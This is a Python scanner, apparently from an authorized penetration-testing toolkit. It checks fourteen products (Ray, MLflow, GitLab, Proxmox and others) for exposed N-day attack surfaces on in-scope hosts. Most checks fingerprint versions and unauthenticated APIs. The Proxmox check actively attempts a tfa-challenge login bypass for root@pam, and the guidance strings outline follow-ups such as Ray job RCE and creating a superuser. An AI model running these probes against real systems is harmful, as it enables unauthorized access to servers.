#!/usr/bin/env python3
"""N-day 族专用表面（授权目标）。每族自己的路径和 L2，不靠 nuclei 结案。

用法:
  python3 炼蛊房/nday_family_probe.py --family ray --base https://授权站 --case <案>
  python3 炼蛊房/nday_family_probe.py --list
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import UTC, datetime
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-nday-family"


def ver_tuple(text: str) -> tuple[int, int, int]:
    nums = [int(x) for x in re.findall(r"\d+", text or "")[:3]]
    while len(nums) < 3:
        nums.append(0)
    return nums[0], nums[1], nums[2]


def in_range(ver: str, lo: tuple[int, int, int], hi: tuple[int, int, int]) -> bool:
    t = ver_tuple(ver)
    return lo <= t < hi


def gitea_vuln_window(ver: str) -> bool:
    return bool(ver) and ver_tuple(ver) < (1, 27, 1)


def trueconf_vuln_window(ver: str) -> bool:
    if not ver:
        return False
    t = ver_tuple(ver)
    if t < (5, 3, 0):
        return True
    if t[0] == 5 and t[1] == 3 and t[2] <= 9:
        return True
    if t[0] == 5 and t[1] == 4 and t[2] <= 9:
        return True
    return t[0] == 5 and t[1] == 5 and t[2] <= 5


def _get(
    sess: requests.Session,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    try:
        r = sess.get(
            url, timeout=timeout, verify=False, allow_redirects=True, headers=headers or {}
        )
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    data: Any = None
    try:
        data = r.json()
    except Exception:
        data = None
    return {
        "url": url,
        "status": r.status_code,
        "size": len(text),
        "json": data,
        "text": text[:4000],
        "snip": re.sub(r"\s+", " ", text)[:160],
    }


def _post_form(sess: requests.Session, url: str, data: dict[str, str]) -> dict[str, Any]:
    try:
        r = sess.post(url, data=data, timeout=10, verify=False, allow_redirects=True)
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    js: Any = None
    try:
        js = r.json()
    except Exception:
        js = None
    return {
        "url": url,
        "status": r.status_code,
        "json": js,
        "snip": re.sub(r"\s+", " ", text)[:160],
    }


def _post_json(sess: requests.Session, url: str, body: dict[str, Any]) -> dict[str, Any]:
    try:
        r = sess.post(url, json=body, timeout=10, verify=False, allow_redirects=True)
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    data: Any = None
    try:
        data = r.json()
    except Exception:
        data = None
    return {"url": url, "status": r.status_code, "json": data, "snip": re.sub(r"\s+", " ", text)[:160]}


def _has(row: dict[str, Any], *needles: str) -> bool:
    blob = ((row.get("text") or "") + " " + str(row.get("json") or "")).lower()
    return any(n.lower() in blob for n in needles)


def check_owncloud(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    st = _get(sess, urljoin(base + "/", "status.php"))
    if st.get("status") == 200 and _has(st, "owncloud", "versionstring", "productname"):
        ver = ""
        js = st.get("json") or {}
        if isinstance(js, dict):
            ver = str(js.get("versionstring") or js.get("version") or "")
        lvl = "L2" if ver and in_range(ver, (10, 6, 0), (10, 13, 1)) else "L1"
        rows.append({
            "level": lvl, "signal": "status-php", "version": ver, "path": "/status.php",
            "vuln_window": lvl == "L2",
        })
    dav = _get(sess, urljoin(base + "/", "remote.php/dav"))
    if dav.get("status") in {200, 401, 403} and not dav.get("error"):
        rows.append({
            "level": "L1", "signal": "webdav-surface", "path": "/remote.php/dav",
            "status": dav.get("status"),
        })
    return rows


def check_ray(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    ver = _get(sess, urljoin(base + "/", "api/version"))
    if ver.get("status") == 200 and _has(ver, "ray_version", "ray"):
        js = ver.get("json") if isinstance(ver.get("json"), dict) else {}
        rows.append({
            "level": "L1", "signal": "api-version", "path": "/api/version",
            "ray_version": str((js or {}).get("ray_version") or "")[:40],
        })
    jobs_curl = _get(
        sess, urljoin(base + "/", "api/jobs"), headers={"User-Agent": "大爱仙尊-ray/1.0"}
    )
    jobs_moz = _get(sess, urljoin(base + "/", "api/jobs"))
    listed = jobs_curl.get("status") == 200 and (
        isinstance(jobs_curl.get("json"), (list, dict)) or _has(jobs_curl, "jobs", "submission_id")
    )
    if listed:
        rows.append({
            "level": "L2", "signal": "jobs-unauth", "path": "/api/jobs",
            "mozilla_status": jobs_moz.get("status"),
            "note": "非 Mozilla UA 列出作业；提交 job 授权内直接做",
        })
    return rows


def check_mlflow(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    home = _get(sess, urljoin(base + "/", ""))
    if _has(home, "mlflow", "ajax-api/2.0/mlflow"):
        rows.append({"level": "L1", "signal": "mlflow-html", "path": "/"})
    hooks = _get(sess, urljoin(base + "/", "api/2.0/mlflow/webhooks"))
    if hooks.get("status") == 200 and (
        isinstance(hooks.get("json"), dict) or _has(hooks, "webhooks")
    ):
        rows.append({
            "level": "L2", "signal": "webhooks-unauth", "path": "/api/2.0/mlflow/webhooks",
            "note": "/test 只打你控制的协作 URL，禁止默认 IMDS",
        })
    return rows


def check_gitlab(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    login = _get(sess, urljoin(base + "/", "users/sign_in"))
    if login.get("status") == 200 and _has(login, "gitlab", "gon.gitlab"):
        rows.append({"level": "L1", "signal": "sign-in", "path": "/users/sign_in"})
    meta = _post_json(
        sess,
        urljoin(base + "/", "api/graphql"),
        {"query": "{ metadata { version } }"},
    )
    js = meta.get("json") if isinstance(meta.get("json"), dict) else {}
    data = (js or {}).get("data") if isinstance(js, dict) else None
    ver = ""
    if isinstance(data, dict):
        md = data.get("metadata") or {}
        if isinstance(md, dict):
            ver = str(md.get("version") or "")
    if meta.get("status") == 200 and ver:
        rows.append({
            "level": "L2", "signal": "graphql-metadata", "path": "/api/graphql",
            "version": ver[:40],
        })
    pubs = _get(sess, urljoin(base + "/", "api/v4/projects?visibility=public&per_page=1"))
    if pubs.get("status") == 200 and isinstance(pubs.get("json"), list):
        rows.append({"level": "L1", "signal": "public-projects", "path": "/api/v4/projects"})
    return rows


def check_zimbra(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    z = _get(sess, urljoin(base + "/", "zimbra/"))
    if z.get("status") == 200 and _has(z, "zimbra", "zimbrawebclient"):
        rows.append({"level": "L1", "signal": "zimbra-web", "path": "/zimbra/"})
    js = _get(sess, urljoin(base + "/", "js/zimbraMail/share/model/ZmSettings.js"))
    if js.get("status") == 200 and _has(js, "zimbra"):
        rows.append({"level": "L1", "signal": "zimbra-js", "path": "/js/zimbraMail/share/model/ZmSettings.js"})
    return rows


def check_weblogic(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    console = _get(sess, urljoin(base + "/", "console/login/LoginForm.jsp"))
    if console.get("status") in {200, 302} and _has(console, "weblogic", "oracle"):
        rows.append({"level": "L1", "signal": "console", "path": "/console/login/LoginForm.jsp"})
    wsat = _get(sess, urljoin(base + "/", "wls-wsat/CoordinatorPortType"))
    if wsat.get("status") in {200, 500} and _has(wsat, "wsat", "coordinator", "fault"):
        rows.append({"level": "L1", "signal": "wls-wsat", "path": "/wls-wsat/CoordinatorPortType"})
    return rows


def check_upsnap(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    home = _get(sess, urljoin(base + "/", ""))
    if _has(home, "upsnap", "wake on lan", "wake-on-lan"):
        rows.append({"level": "L1", "signal": "upsnap-html", "path": "/"})
    init = _get(sess, urljoin(base + "/", "api/upsnap/init-superuser"))
    if init.get("status") not in {None, 404} and not init.get("error"):
        rows.append({
            "level": "L2" if init.get("status") in {200, 204, 400, 405} else "L1",
            "signal": "init-superuser-surface",
            "path": "/api/upsnap/init-superuser",
            "status": init.get("status"),
            "note": "有面再按 Playbook POST 建探针超管；已有超管转弱口",
        })
    return rows


def check_mrbs(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    for path in ("mrbs/", "mrbs/index.php", ""):
        row = _get(sess, urljoin(base + "/", path))
        if row.get("status") == 200 and _has(row, "meeting room", "mrbs", "mrbs.css"):
            rows.append({"level": "L1", "signal": "mrbs-html", "path": "/" + path})
            break
    edit = _get(sess, urljoin(base + "/", "mrbs/edit_entry.php"))
    if edit.get("status") == 200 and _has(edit, "url", "entry", "mrbs"):
        rows.append({
            "level": "L2", "signal": "edit-entry-url", "path": "/mrbs/edit_entry.php",
            "note": "SSRF 参数先打协作域，禁止默认 IMDS",
        })
    return rows


def check_geoserver(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    web = _get(sess, urljoin(base + "/", "geoserver/web/"))
    if web.get("status") == 200 and _has(web, "geoserver"):
        rows.append({"level": "L1", "signal": "geoserver-web", "path": "/geoserver/web/"})
    caps = _get(
        sess,
        urljoin(base + "/", "geoserver/wfs?service=WFS&version=1.0.0&request=GetCapabilities"),
    )
    if caps.get("status") == 200 and _has(caps, "wfs", "featuretypename", "geoserver"):
        rows.append({
            "level": "L2", "signal": "wfs-capabilities", "path": "/geoserver/wfs",
            "note": "jsonArrayContains 按 Playbook 做布尔差分，不 COPY TO PROGRAM",
        })
    return rows


def check_sharepoint(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    lay = _get(sess, urljoin(base + "/", "_layouts/15/"))
    if lay.get("status") in {200, 401, 403} and (
        _has(lay, "sharepoint", "microsoft", "_layouts") or lay.get("status") in {401, 403}
    ):
        rows.append({"level": "L1", "signal": "layouts15", "path": "/_layouts/15/", "status": lay.get("status")})
    api = _get(sess, urljoin(base + "/", "_api/web"))
    if api.get("status") in {200, 401, 403} and (
        _has(api, "odata", "sharepoint", "sp.web") or api.get("status") in {200, 401}
    ):
        lvl = "L2" if api.get("status") == 200 and _has(api, "odata", "sp.web", "title") else "L1"
        rows.append({"level": lvl, "signal": "rest-web", "path": "/_api/web", "status": api.get("status")})
    return rows


def check_freepbx(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    cfg = _get(sess, urljoin(base + "/", "admin/config.php"))
    if cfg.get("status") in {200, 302} and _has(cfg, "freepbx", "ucp", "asterisk"):
        rows.append({"level": "L1", "signal": "admin-config", "path": "/admin/config.php"})
    admin = _get(sess, urljoin(base + "/", "admin/"))
    if admin.get("status") in {200, 302} and _has(admin, "freepbx", "free pbx"):
        rows.append({"level": "L1", "signal": "admin", "path": "/admin/"})
    return rows


def check_gitea(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    ver_row = _get(sess, urljoin(base + "/", "api/v1/version"))
    js = ver_row.get("json") if isinstance(ver_row.get("json"), dict) else {}
    ver = str((js or {}).get("version") or "")
    if ver_row.get("status") == 200 and ver:
        rows.append({
            "level": "L2" if gitea_vuln_window(ver) else "L1",
            "signal": "api-version",
            "path": "/api/v1/version",
            "version": ver[:40],
            "vuln_window": gitea_vuln_window(ver),
            "note": "禁止 POST 恶意 diff/hook",
        })
    swagger = _get(sess, urljoin(base + "/", "api/swagger"))
    if swagger.get("status") == 200 and _has(swagger, "gitea", "swagger"):
        rows.append({"level": "L1", "signal": "swagger", "path": "/api/swagger"})
    return rows


def check_trueconf(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    home = _get(sess, urljoin(base + "/", ""))
    if home.get("status") == 200 and _has(home, "trueconf"):
        ver = ""
        m = re.search(r"(?:trueconf(?: server)?|version)[^\d]{0,12}(\d+\.\d+(?:\.\d+)?)", (home.get("snip") or ""), re.I)
        if m:
            ver = m.group(1)
        rows.append({
            "level": "L2" if trueconf_vuln_window(ver) else "L1",
            "signal": "trueconf-web",
            "path": "/",
            "version": ver[:20],
            "note": "只指纹 Web；4307 未文档函数/逃逸不做",
        })
    return rows


def check_proxmox(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    home = _get(sess, urljoin(base + "/", ""))
    if home.get("status") == 200 and _has(home, "proxmox", "pve.username"):
        rows.append({"level": "L2", "signal": "pve-web", "path": "/"})
    ver_row = _get(sess, urljoin(base + "/", "api2/json/version"))
    js = ver_row.get("json") if isinstance(ver_row.get("json"), dict) else {}
    data = (js or {}).get("data") if isinstance(js, dict) else None
    rel = ""
    if isinstance(data, dict):
        rel = str(data.get("release") or data.get("version") or "")
    elif isinstance(js, dict):
        rel = str(js.get("release") or js.get("version") or "")
    if ver_row.get("status") == 200 and (rel or _has(ver_row, "proxmox", "pve", "release")):
        rows.append({
            "level": "L1",
            "signal": "api-version",
            "path": "/api2/json/version",
            "release": rel[:40],
        })
    bypass = _post_form(
        sess,
        urljoin(base + "/", "api2/json/access/ticket"),
        {"username": "root@pam", "password": "x", "tfa-challenge": "x"},
    )
    bjs = bypass.get("json") if isinstance(bypass.get("json"), dict) else {}
    ticket = ""
    if isinstance(bjs, dict):
        inner = bjs.get("data") if isinstance(bjs.get("data"), dict) else bjs
        if isinstance(inner, dict):
            ticket = str(inner.get("ticket") or "")
    if ticket.startswith("PVE:"):
        rows.append({
            "level": "L3",
            "signal": "tfa-challenge-bypass",
            "path": "/api2/json/access/ticket",
            "ticket_prefix": ticket[:12],
            "note": "root@pam 票已出；证据脱敏，勿改原超管密",
        })
    elif bypass.get("status") in {200, 401} and not bypass.get("error"):
        rows.append({
            "level": "L1",
            "signal": "ticket-surface",
            "path": "/api2/json/access/ticket",
            "status": bypass.get("status"),
        })
    return rows


FAMILIES: dict[str, Any] = {
    "owncloud": {
        "playbook": "传承/私云·预签.md",
        "skill": "私云",
        "fn": check_owncloud,
        "next": "L2=版本窗 10.6–<10.13.1。授权内伪造 OC-Signature 读文件。",
    },
    "ray": {
        "playbook": "传承/光台·无门.md",
        "skill": "光台无门",
        "fn": check_ray,
        "next": "L2=未授权 /api/jobs。提交 job RCE 授权内直接做。",
    },
    "mlflow": {
        "playbook": "传承/流实验·游方.md",
        "skill": "流实验",
        "fn": check_mlflow,
        "next": "L2=未授权 webhooks。/test 只打协作 URL。",
    },
    "gitlab": {
        "playbook": "传承/文山·无门.md",
        "skill": "文山",
        "fn": check_gitlab,
        "next": "L2=GraphQL metadata 未鉴权。改删授权内直接做。",
    },
    "zimbra": {
        "playbook": "传承/信巢·闻管.md",
        "skill": "信巢",
        "fn": check_zimbra,
        "next": "L1=Zimbra Web。SMTP/SNMP payload 无 PoC 不做。",
    },
    "weblogic": {
        "playbook": "传承/房睇长·耳报-08-28.md",
        "skill": "逻辑府",
        "fn": check_weblogic,
        "next": "L1=控制台/WSAT。无完整 PoC 只指纹，阳性上报。",
    },
    "upsnap": {
        "playbook": "传承/资产册·开天.md",
        "skill": "资产册",
        "fn": check_upsnap,
        "next": "L2=init-superuser 有面。无超管则建探针号。",
    },
    "mrbs": {
        "playbook": "传承/议室·游方.md",
        "skill": "议室",
        "fn": check_mrbs,
        "next": "L2=edit_entry URL 面。先协作域。",
    },
    "geoserver": {
        "playbook": "传承/地图府·吞库.md",
        "skill": "地图府",
        "fn": check_geoserver,
        "next": "L2=WFS Capabilities。注入差分走 Playbook，不 COPY TO PROGRAM。",
    },
    "sharepoint": {
        "playbook": "传承/窗府·化形.md",
        "skill": "窗府·无门",
        "fn": check_sharepoint,
        "next": "L2=_api/web 未授权 JSON。aspx 上传走专档。",
    },
    "freepbx": {
        "playbook": "传承/话巢·开天.md",
        "skill": "话巢",
        "fn": check_freepbx,
        "next": "L1=admin/config。模块面按 Playbook。",
    },
    "gitea": {
        "playbook": "传承/文仓·开天.md",
        "skill": "文仓",
        "fn": check_gitea,
        "next": "L2=版本 < 1.27.1。禁止 POST 恶意 diff/hook。",
    },
    "trueconf": {
        "playbook": "传承/话巢·脚本.md",
        "skill": "一日针匣",
        "fn": check_trueconf,
        "next": "L2=版本落影响窗。4307 未文档函数/逃逸先问。",
    },
    "proxmox": {
        "playbook": "传承/虚机府·免密.md",
        "skill": "虚机府",
        "fn": check_proxmox,
        "next": "L2=PVE Web；L3=tfa-challenge 出票。票脱敏。",
    },
}


def run(args: argparse.Namespace) -> dict[str, Any]:
    spec = FAMILIES[args.family]
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    base = args.base.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    findings = spec["fn"](sess, base)
    level = "none"
    for want in ("L3", "L2", "L1"):
        if any(f.get("level") == want for f in findings):
            level = want
            break
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "family": args.family,
        "level": level,
        "findings": findings,
        "playbook": spec["playbook"],
        "skill": spec["skill"],
        "next": spec["next"],
    }
    out = write_probe_json(
        report, case=args.case, out=args.out, case_subdir=f"nday_{args.family}", filename="surface.json",
    )
    print(json.dumps({"family": args.family, "level": level, "findings": len(findings), "out": str(out)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="N-day 族专用表面（授权内）")
    ap.add_argument("--family", choices=sorted(FAMILIES), help="组件族")
    ap.add_argument("--base", "-u", default="")
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--list", action="store_true")
    args = ap.parse_args()
    if args.list or not args.family:
        for name, spec in FAMILIES.items():
            print(f"{name:12} {spec['skill']}")
        if args.list:
            return
        ap.error("需要 --family")
    if not args.base:
        ap.error("需要 --base")
    run(args)


if __name__ == "__main__":
    main()
